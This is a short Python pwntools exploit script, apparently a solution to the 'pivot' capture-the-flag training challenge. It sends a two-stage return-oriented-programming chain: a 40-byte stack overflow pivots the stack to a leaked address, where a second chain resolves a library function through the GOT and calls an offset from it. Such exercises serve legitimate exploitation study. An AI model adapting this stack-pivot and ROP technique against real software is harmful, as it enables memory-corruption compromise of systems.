import struct
from pwn import *

# Setup the binary 
elf = ELF("./pivot")
p = elf.process()

# Addresses
pop_rax = 0x400b00
xchg_rsp = 0x400b02
mov_rax_memrax = 0x400b05
foothold_got = 0x602048
foothold_plt = 0x400850
pop_rbp = 0x400900
add_rax_rbp = 0x400b09
call_rax = 0x40098e

# Get addr
pivot_addr = int(p.recvline_contains("The Old Gods kindly bestow upon you a place to pivot:").rstrip().rsplit(' ', 1)[1], 16)
log.success("Found pivot address: " + str(hex(pivot_addr)))

# Stage 2 payload
stage2_buf = ""
stage2_buf += struct.pack("<Q", foothold_plt)
stage2_buf += struct.pack("<Q", pop_rax)
stage2_buf += struct.pack("<Q", foothold_got)
stage2_buf += struct.pack("<Q", mov_rax_memrax)
stage2_buf += struct.pack("<Q", pop_rbp)
stage2_buf += struct.pack("<Q", 0x14e)
stage2_buf += struct.pack("<Q", add_rax_rbp)
stage2_buf += struct.pack("<Q", call_rax)

# Stage 1 payload
stage1_buf = ""
stage1_buf += 'A' * 40
stage1_buf += struct.pack("<Q", pop_rax)
stage1_buf += struct.pack("<Q", pivot_addr)
stage1_buf += struct.pack("<Q", xchg_rsp)

# Send payload
log.success("Sending stage2..")
p.recvuntil("Send your second chain now and it will land there")
p.sendline(stage2_buf)
log.success("Sending stage1..")
p.recvuntil("Now kindly send your stack smash")
p.sendline(stage1_buf)
print p.recvall()[-33:]

